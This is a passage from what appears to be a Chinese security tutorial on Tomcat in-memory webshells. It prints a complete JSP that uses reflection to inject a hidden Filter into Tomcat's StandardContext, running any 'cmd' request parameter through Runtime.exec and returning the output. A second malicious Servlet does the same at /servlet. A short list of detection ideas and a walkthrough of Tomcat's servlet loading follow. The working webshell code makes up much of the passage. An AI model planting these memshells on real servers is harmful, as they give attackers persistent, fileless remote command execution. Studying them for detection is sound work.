<h5 id="动态注册Filter内存马"><a href="#动态注册Filter内存马" class="headerlink" title="动态注册Filter内存马"></a>动态注册Filter内存马</h5><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// 将filterConfig添加至filterConfigs数组</span><br>Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-built_in">Map</span> filterConfigs = (<span class="hljs-built_in">Map</span>) Configs.<span class="hljs-keyword">get</span>(standardContext);<br><span class="hljs-comment">// 将filterConfig添加至filterConfigs数组</span><br>filterConfigs.put(filterName,filterConfig);<br></code></pre></td></tr></table></figure>

<h4 id="Filter内存马完整代码"><a href="#Filter内存马完整代码" class="headerlink" title="Filter内存马完整代码"></a>Filter内存马完整代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;example.demo.Filter_memshell&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.webresources.StandardRoot&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">private</span> String message;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>            message = <span class="hljs-string">&quot;调用 Filter_mem&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-comment">// 执行命令</span><br>            <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                printWriter.write(<span class="hljs-string">&quot;Filter_memshell 被执行&quot;</span>);<br>                <span class="hljs-type">int</span> len;<br>                <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                    printWriter.write(len);<br>                &#125;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">// 放行请求</span><br>            chain.doFilter(request,response);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filter_memshell&quot;</span>;<br>        <span class="hljs-comment">// 获取ServletContext</span><br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br>        <span class="hljs-comment">// 如果存在此filterName的Filter，则不在重复添加</span><br>        <span class="hljs-keyword">if</span> (servletContext.getFilterRegistration(filterName) == <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-comment">// 获取StandardContext方法一</span><br>            <span class="hljs-comment">// Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br>            <span class="hljs-comment">// reqF.setAccessible(true);</span><br>            <span class="hljs-comment">// Request req = (Request) reqF.get(request);</span><br>            <span class="hljs-comment">// StandardContext standardContext = (StandardContext) req.getContext();</span><br><br>            <span class="hljs-comment">// 获取StandardContext方法二</span><br>            <span class="hljs-comment">// 获取ApplicationContextFacade类</span><br>            <span class="hljs-comment">// ServletContext servletContext = request.getSession().getServletContext();</span><br>            <span class="hljs-comment">// // 反射获取ApplicationContextFacade类属性context为ApplicationContext类</span><br>            <span class="hljs-comment">// Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br>            <span class="hljs-comment">// appContextField.setAccessible(true);</span><br>            <span class="hljs-comment">// ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);</span><br>            <span class="hljs-comment">// // 反射获取ApplicationContext类属性context为StandardContext类</span><br>            <span class="hljs-comment">// Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br>            <span class="hljs-comment">// standardContextField.setAccessible(true);</span><br>            <span class="hljs-comment">// StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><br>            <span class="hljs-comment">// 获取StandardContext方法三</span><br>            <span class="hljs-comment">// WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br>            <span class="hljs-comment">// StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><br>            <span class="hljs-comment">// 获取StandardContext方法四</span><br>            <span class="hljs-comment">// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span><br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">while</span> (standardContext == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>                f.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> f.get(servletContext);<br><br>                <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> ServletContext) &#123;<br>                    servletContext = (ServletContext) object;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> StandardContext) &#123;<br>                    standardContext = (StandardContext) object;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 创建FilterDef对象</span><br>            <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>            filterDef.setFilterName(filterName);<br>            filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter_memshell</span>());<br>            filterDef.setFilterClass(Filter_memshell.class.getName());<br>            <span class="hljs-comment">// 添加FilterDef对象</span><br>            standardContext.addFilterDef(filterDef);<br><br>            <span class="hljs-comment">// 创建FilterMap</span><br>            <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>            filterMap.setFilterName(filterName);<br>            filterMap.addURLPattern(<span class="hljs-string">&quot;/filter&quot;</span>);<br>            filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>            <span class="hljs-comment">// 调用standardContext#addFilterMapBefore添加FilterMap对象</span><br>            standardContext.addFilterMapBefore(filterMap);<br><br>            <span class="hljs-comment">// // 调用FilterMaps#addBefore添加FilterMap对象</span><br>            <span class="hljs-comment">// Class ContextFilterMaps = Class.forName(&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;);</span><br>            <span class="hljs-comment">// Field filterMapsField = standardContext.getClass().getDeclaredField(&quot;filterMaps&quot;);</span><br>            <span class="hljs-comment">// filterMapsField.setAccessible(true);</span><br>            <span class="hljs-comment">// Object contextFilterMaps = filterMapsField.get(standardContext);</span><br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// Class cl = Class.forName(&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;);</span><br>            <span class="hljs-comment">// Method m = cl.getDeclaredMethod(&quot;addBefore&quot;, FilterMap.class);</span><br>            <span class="hljs-comment">// m.setAccessible(true);</span><br>            <span class="hljs-comment">// m.invoke(contextFilterMaps, filterMap);</span><br><br>            <span class="hljs-comment">// 获得filterConfigs数组</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">// 创建 ApplicationFilterConfig 对象</span><br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>            constructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>            <span class="hljs-comment">// 将filterConfig添加至filterConfigs数组</span><br>            filterConfigs.put(filterName,filterConfig);<br>            response.getWriter().println(<span class="hljs-string">&quot;Filter内存马添加成功&quot;</span>);<br><br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        response.getWriter().println(e.getMessage());<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<p>在<code>doFilter</code>中(代码第42行)有一个return，这是为了防止访问时出现404报错，由于Servlet没有这个路由网页，因此后端返回404，但此时doFilter是已经成功执行命令的，为了使其回显出来，因此添加了return，使得请求不通过Servlet直接返回。</p>
<p><img src="https://img-blog.csdnimg.cn/b34559198e5a4ab8ae08a8a8df82b224.png" srcset="/img/loading.gif" lazyload alt="image-20221125235311267"></p>
<p><img src="https://img-blog.csdnimg.cn/fb2b6806e04d47c7822052bf1c5e0ddb.png" srcset="/img/loading.gif" lazyload alt="image-20221126194319895"></p>
<h4 id="Tomcat各版本对Filter内存马支持"><a href="#Tomcat各版本对Filter内存马支持" class="headerlink" title="Tomcat各版本对Filter内存马支持"></a>Tomcat各版本对Filter内存马支持</h4><p>首先之前构造的Filter型内存马是指支持Tomcat7以上，原因是因为 <code>javax.servlet.DispatcherType</code> 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3。</p>
<p>且在Tomcat7与8中 FilterDef 和 FilterMap 这两个类所属的包名不一样<br><strong>tomcat 7:</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">org.apache.catalina.deploy.FilterDef;</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.apache.catalina.deploy.FilterMap;</span><br></code></pre></td></tr></table></figure>

<p><strong>tomcat 8:</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">org.apache.tomcat.util.descriptor.web.FilterMap;</span><br></code></pre></td></tr></table></figure>



<h4 id="Filter内存马检测思路"><a href="#Filter内存马检测思路" class="headerlink" title="Filter内存马检测思路"></a>Filter内存马检测思路</h4><ul>
<li>检测带有特殊函数的filter名字</li>
<li>filter优先级，filter内存马的优先级一般为最高</li>
<li>查看web.xml中有没有可以的filter配置</li>
<li>检查特殊的classloader</li>
<li>检测classloader路径下没有class文件</li>
<li>检测Filter中的doFilter方法是否有恶意代码</li>
<li>如果是代码执⾏漏洞，排查中间件的 error.log，查看是否有可疑的报错，判断注⼊时间和⽅法</li>
</ul>
<h3 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h3><p>​		servlet是一种运行在服务器端的java应用程序，主要功能在于交互式地浏览和修改数据，生成动态Web内容。基本流程为：</p>
<ul>
<li>客户端发送请求至服务器端；</li>
<li>服务器将请求信息发送至Servlet；</li>
<li>Servlet生成响应信息并将其传给服务器。响应内容动态生成，通常取决于客户端的请求；</li>
<li>服务将响应返回给客户端。</li>
</ul>
<h4 id="恶意Servlet"><a href="#恶意Servlet" class="headerlink" title="恶意Servlet"></a>恶意Servlet</h4><p>在进行Servlet编写之前，我们先对手动生成一个恶意的Servlet，使用注解的方式手动在服务器后台添加Servlet。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/example/demo/Servlet_memshell.jsp</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-meta">@WebServlet(</span><br><span class="hljs-meta">        name = &quot;Servlet_memshell&quot;,</span><br><span class="hljs-meta">        urlPatterns = &quot;/servlet&quot;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_memshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Servlet 命令执行输出：\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                resp.getWriter().write(message);<br>                <span class="hljs-type">int</span> len;<br>                <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                    resp.getWriter().write(len);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                resp.getWriter().println(e.getMessage());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​		访问<code>http://localhost:8080/servlet?cmd=whoami</code>，命令执行成功。此时我们获得了一个可以执行命令的Servlet。</p>
<p><img src="https://img-blog.csdnimg.cn/ca2956e2a4b04b62b57b6d3310bd0228.png" srcset="/img/loading.gif" lazyload alt="image-20221128112700365"></p>
<h4 id="动态注册Servlet流程"><a href="#动态注册Servlet流程" class="headerlink" title="动态注册Servlet流程"></a>动态注册Servlet流程</h4><p>我们使用Listener监听servlet来了解servlet在tomcat中的建立过程，在<code>contextInitialized</code>处下断点。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// src/main/java/example/demo/Listener_servlet</span><br>package example.<span class="hljs-property">demo</span>;<br><br><span class="hljs-keyword">import</span> javax.<span class="hljs-property">servlet</span>.<span class="hljs-property">ServletContextEvent</span>;<br><span class="hljs-keyword">import</span> javax.<span class="hljs-property">servlet</span>.<span class="hljs-property">ServletContextListener</span>;<br><span class="hljs-keyword">import</span> javax.<span class="hljs-property">servlet</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">WebListener</span>;<br><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Listener_servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContextListener</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">contextInitialized</span>(<span class="hljs-params"><span class="hljs-title class_">ServletContextEvent</span> sce</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;ServletContext对象创建了！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">contextDestroyed</span>(<span class="hljs-params"><span class="hljs-title class_">ServletContextEvent</span> sce</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;ServletContext对象销毁了！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进入<code>StandardContext#startInternal</code>可以发现调用<code>StandardContext#loadOnStartup</code>加载启动servlet。</p>
<p><img src="https://img-blog.csdnimg.cn/5afcb886ab9a406aa4d353996f854a88.png" srcset="/img/loading.gif" lazyload alt="image-20221201225714005"></p>
<p>跟进<code>StandardContext#loadOnStartup</code>，发现<code>loadOnStartup</code>中遍历传入<code>children</code>参数，并判断<code>loadOnStartup</code>，如果&gt;&#x3D;0，则放<code>list</code>中，并使用<code>wrapper.load()</code>进行加载。<code>children</code>参数内容就是tomcat需要创建的servlet，这里我们可以看到tomcat自己创建的<code>default</code>和<code>jsp</code>servlet以及，我们自己创建的<code>Servlet_memshell</code>servlet，<code>Login</code>也是我们自己创建的，对Servlet内存马没有影响，这里可忽略</p>
<p><img src="https://img-blog.csdnimg.cn/a554d4146b3b4807b1606d552f0ff943.png" srcset="/img/loading.gif" lazyload alt="image-20221201231335791"></p>
<p><code>loadOnStartup</code>实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序0，正数的值越小，启动该servlet的优先级越高，默认值为-1，此时只有当Servlet被调用时才加载到内存中，<code>loadOnStartup</code>在<code>web.xml</code>中由<code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code>标签指定。由于我们要注入内存马，且没有配置xml不会在应用启动时就加载这个servlet，因此需要把优先级调至1，让自己写的servlet直接被加载。</p>
<p><img src="https://img-blog.csdnimg.cn/e1e6e1dc19f54c6f92b22bbbf908f1ee.png" srcset="/img/loading.gif" lazyload alt="image-20221201230351653"></p>
<p>继续查找children是从哪里保存的，既然能够生成我们所设置的servlet，那么一定读取了<code>web.xml</code>。</p>
<p>经过查找在<code>StandContext#startInternal</code>中，调用<code>fireLifecycleEvent</code>进行配置。</p>
<p><img src="https://img-blog.csdnimg.cn/2140b15aac48432597a45f36e3ce7939.png" srcset="/img/loading.gif" lazyload alt="image-20221204191247827"></p>
<p><img src="https://img-blog.csdnimg.cn/44323cce984b4183970c93a6696f9aa8.png" srcset="/img/loading.gif" lazyload alt="image-20221204191357849"></p>
<p>在<code>ContextConfig#configureStart</code>中发现调用了<code>webConfig</code>配置。</p>
<p><img src="https://img-blog.csdnimg.cn/96ee85d6234b48d08f6427225cdbff8d.png" srcset="/img/loading.gif" lazyload alt="image-20221204191658079"></p>
<p>最终在<code>ContextConfig#webConfig</code>中发现<code>contextWebXml</code>变量，可以看到其中存在<code>web.xml</code>的物理路径。</p>
<p><img src="https://img-blog.csdnimg.cn/55e9ee08aed34e44abaee0a7b742aeab.png" srcset="/img/loading.gif" lazyload alt="image-20221204191724680"></p>
<p>继续向下执行，发现除了读取<code>web.xml</code>外，同时合并了注解类型的配置，以及tomcat默认配置，最终存储在<code>webXml</code>变量中，我们可以看到<code>Login</code>是在<code>web.xml</code>中进行配置的，<code>Servlet_menshell</code>是通过注解配置的，而<code>default</code>和<code>jsp</code>是tomcat默认配置的，这就解释了tomcat为什么能够解析jsp代码，因为其中默认配置了<code>jsp</code>的servlet。</p>
<p><img src="https://img-blog.csdnimg.cn/ecdd8fda9b27401c9bd649932f71b7a3.png" srcset="/img/loading.gif" lazyload alt="image-20221204192436399"></p>
<p>最后进入<code>ContextConfig#configureContext</code>应用配置，在<code>configureContext</code>我们能够发现，应用servlet的具体步骤，同时在此处我们也可以了解到listener和filter组件应用的步骤。</p>
